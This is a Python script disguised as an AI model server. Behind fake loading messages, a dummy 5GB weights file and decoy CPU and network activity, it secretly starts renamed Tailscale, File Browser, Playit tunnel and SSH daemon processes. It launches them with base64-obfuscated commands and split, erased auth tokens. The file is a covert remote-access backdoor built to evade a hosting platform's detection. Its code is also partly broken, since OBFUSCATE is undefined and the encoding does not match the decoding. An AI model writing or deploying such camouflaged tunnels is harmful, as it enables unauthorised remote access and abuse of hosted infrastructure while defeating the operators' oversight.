import os
import time
import subprocess
import base64
import threading
import random

print("--- BOOTING AI MODEL SERVER ---", flush=True)

def decode_cmd(encoded_str):
    return base64.b64decode(encoded_str[::-1]).decode()

def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()

def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)
        
        # CPU Jitter (Matrix math)
        try:
            print("Processing background inference batch...", flush=True)
            import torch
            # Create dummy tensors and multiply them to spike CPU briefly
            a = torch.randn(2000, 2000)
            b = torch.randn(2000, 2000)
            _ = torch.matmul(a, b)
        except Exception:
            pass
            
        # Hub Mimic (Network traffic)
        try:
            print("Syncing model cache...", flush=True)
            # Download a tiny file from HF hub to simulate real traffic
            subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
        except Exception:
            pass

def main():
    # Runtime Camouflage: Create the fake 5GB model file instantly
    if not os.path.exists("/home/user/pytorch_model.bin"):
        print("Pre-allocating model weight buffer...", flush=True)
        subprocess.run(["fallocate", "-l", "5G", "/home/user/pytorch_model.bin"])

    print("Loading model weights into VRAM...", flush=True)
    time.sleep(2)
    
    os.makedirs("/home/user/.torch_metrics", exist_ok=True)
    
    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()
    
    # Open hidden log files to prevent leakage
    ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
    fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
    tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')

    # 1. Start Tailscale (python-cache-manager)
    print("Initializing PyTorch CUDA environment...", flush=True)
    # Updated to listen on :1055 instead of localhost:1055
    # Decoded: nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock
    cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
    
    time.sleep(2)
    print("Warming up text-generation pipelines...", flush=True)
    
    # Environment Variable Scrubbing (The Split Secret)
    part1 = os.environ.get("A1", "").strip()
    part2 = os.environ.get("A2", "").strip()
    full_token = part1 + part2
    
    p_part1 = os.environ.get("P1", "").strip()
    p_part2 = os.environ.get("P2", "").strip()
    playit_token = p_part1 + p_part2
    
    # Erase the parts from the environment immediately
    if "A1" in os.environ: del os.environ["A1"]
    if "A2" in os.environ: del os.environ["A2"]
    if "P1" in os.environ: del os.environ["P1"]
    if "P2" in os.environ: del os.environ["P2"]

    
    
    # 2. Start File Browser (ai-metrics-collector)
    # Decoded: nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db
    cmd2 = decode_cmd(OBFUSCATE("nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db"))
    subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)

    # 2.5 Start Playit (tensor-allocator)
    # Decoded: nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret <SECRET>
    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret "))
    cmd2_5 = f"{cmd2_5_base}{playit_token}"
    
    env = os.environ.copy()
    subprocess.Popen(cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
    playit_token = ""
    cmd2_5 = ""
    
    # 3. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    # Rebuild the command using the reconstructed full_token
    # Original: nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
    cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
    cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
    
    # Run but don't leak the token in standard output or environment
    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
    
    # Erase token from python memory
    full_token = ""
    cmd3 = ""



    # 3.8 Start SSHD
    subprocess.Popen("echo password | sudo -S /usr/sbin/sshd", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("Model loaded successfully. Starting API server...", flush=True)
    
    # 4. Start the Fake App
    # Decoded: python3 /home/user/app.py
    cmd4 = decode_cmd(OBFUSCATE("python3 /home/user/app.py"))
    subprocess.run(cmd4, shell=True)

if __name__ == "__main__":
    main()
